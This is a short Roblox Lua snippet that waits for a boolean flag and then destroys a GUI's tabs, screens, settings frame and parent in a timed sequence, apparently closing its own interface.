	while wait() do
	if script.Value.Value == true then
	wait(5)
	script.Parent.MainFrame.Tabs.Credits:Destroy()
	wait(0.7)
	script.Parent.MainFrame.Tabs.Scripts:Destroy()
	wait(0.7)
	script.Parent.MainFrame.Tabs.Home:Destroy()
	wait(0.7)
	wait(3)
	Screens.Home:Destroy()
	wait(0.9)
	Screens.Credits:Destroy()
	wait(0.9)
	Screens.Scripts:Destroy()
	wait(1)
	script.Parent.MainFrame.Settings:Destroy()
	wait(5)
	script.Parent:Destroy()
	else
		if script.Value.Value == false then
		end
	end
	end
end;
